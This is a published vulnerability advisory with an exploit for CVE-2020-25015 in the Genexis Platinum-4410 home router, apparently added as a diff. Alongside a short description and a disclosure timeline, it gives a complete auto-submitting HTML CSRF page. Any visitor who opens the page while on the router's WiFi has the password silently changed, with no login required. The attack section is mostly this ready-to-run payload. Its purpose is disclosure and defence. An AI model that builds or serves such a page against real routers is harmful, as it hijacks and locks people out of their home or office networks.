@@ -1,0 +1,90 @@
+# Exploit Title: Genexis Platinum-4410 P4410-V2-1.28 - Broken Access Control and CSRF
+# Date: 28-08-2020
+# Vendor Homepage: https://www.gxgroup.eu/ont-products/
+# Exploit Author: Jinson Varghese Behanan (@JinsonCyberSec)
+# Author Advisory: https://www.getastra.com/blog/911/csrf-broken-access-control-in-genexis-platinum-4410/
+# Version: v2.1 (software version P4410-V2-1.28)
+# CVE : CVE-2020-25015
+
+1. Description
+
+Platinum 4410 is a compact router from Genexis that is commonly used at homes and offices. Hardware version V2.1 – Software version P4410-V2-1.28 was found to be vulnerable to Broken Access Control and CSRF which could be combined to remotely change the WIFI access point’s password.
+
+2. Impact
+
+An attacker can send the victim a link, which if he clicks while he is connected to the WiFi network established from the vulnerable router, the password of the WIFI access point will get changed via CSRF exploit. As the router is also vulnerable to Broken Access Control, the victim does not need to be logged in to the router’s web-based setup page (192.168.1.1), essentially making this a one-click hack.
+
+3. Proof of Concept
+
+Create an HTML file with the following code:
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.1.1/cgi-bin/net-wlan.asp" method="POST">
+      <input type="hidden" name="wlEnbl" value="ON" />
+      <input type="hidden" name="hwlKeys0" value="" />
+      <input type="hidden" name="hwlKeys1" value="" />
+      <input type="hidden" name="hwlKeys2" value="" />
+      <input type="hidden" name="hwlKeys3" value="" />
+      <input type="hidden" name="hwlgMode" value="9" />
+      <input type="hidden" name="hwlAuthMode" value="WPAPSKWPA2PSK" />
+      <input type="hidden" name="hwlEnbl" value="1" />
+      <input type="hidden" name="hWPSMode" value="1" />
+      <input type="hidden" name="henableSsid" value="1" />
+      <input type="hidden" name="hwlHide" value="0" />
+      <input type="hidden" name="isInWPSing" value="0" />
+      <input type="hidden" name="WpsConfModeAll" value="7" />
+      <input type="hidden" name="WpsConfModeNone" value="0" />
+      <input type="hidden" name="hWpsStart" value="0" />
+      <input type="hidden" name="isCUCSupport" value="0" />
+      <input type="hidden" name="SSIDPre" value="N&#47;A" />
+      <input type="hidden" name="bwControlhidden" value="0" />
+      <input type="hidden" name="ht&#95;bw" value="1" />
+      <input type="hidden" name="wlgMode" value="b&#44;g&#44;n" />
+      <input type="hidden" name="wlChannel" value="0" />
+      <input type="hidden" name="wlTxPwr" value="1" />
+      <input type="hidden" name="wlSsidIdx" value="0" />
+      <input type="hidden" name="SSID&#95;Flag" value="0" />
+      <input type="hidden" name="wlSsid" value="JINSON" />
+      <input type="hidden" name="wlMcs" value="33" />
+      <input type="hidden" name="bwControl" value="1" />
+      <input type="hidden" name="giControl" value="1" />
+      <input type="hidden" name="enableSsid" value="on" />
+      <input type="hidden" name="wlAssociateNum" value="32" />
+      <input type="hidden" name="wlSecurMode" value="WPAand11i" />
+      <input type="hidden" name="wlPreauth" value="off" />
+      <input type="hidden" name="wlNetReauth" value="1" />
+      <input type="hidden" name="wlWpaPsk" value="NEWPASSWORD" />
+      <input type="hidden" name="cb&#95;enablshowpsw" value="on" />
+      <input type="hidden" name="wlWpaGtkRekey" value="" />
+      <input type="hidden" name="wlRadiusIPAddr" value="" />
+      <input type="hidden" name="wlRadiusPort" value="" />
+      <input type="hidden" name="wlRadiusKey" value="" />
+      <input type="hidden" name="wlWpa" value="TKIPAES" />
+      <input type="hidden" name="wlKeyBit" value="64" />
+      <input type="hidden" name="wlKeys" value="" />
+      <input type="hidden" name="wlKeys" value="" />
+      <input type="hidden" name="wlKeys" value="" />
+      <input type="hidden" name="wlKeys" value="" />
+      <input type="hidden" name="WpsActive" value="0" />
+      <input type="hidden" name="wpsmode" value="ap&#45;pbc" />
+      <input type="hidden" name="pinvalue" value="" />
+      <input type="hidden" name="Save&#95;Flag" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+     <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+Open this file in a browser while you are connected to the WIFI. There is no need for the victim to be logged in to the Router admin panel (192.168.1.1). It can be seen that the WIFI connection is dropped. To reconnect, forget the WIFI connection on your laptop or phone and connect using the newly changed password: NEWPASSWORD
+
+
+4. PoC Video: https://www.youtube.com/watch?v=nSu5ANDH2Rk&feature=emb_title
+
+3. Timeline
+
+Vulnerability reported to the Genexis team – August 28, 2020
+Team confirmed firmware release containing fix – September 14, 2020
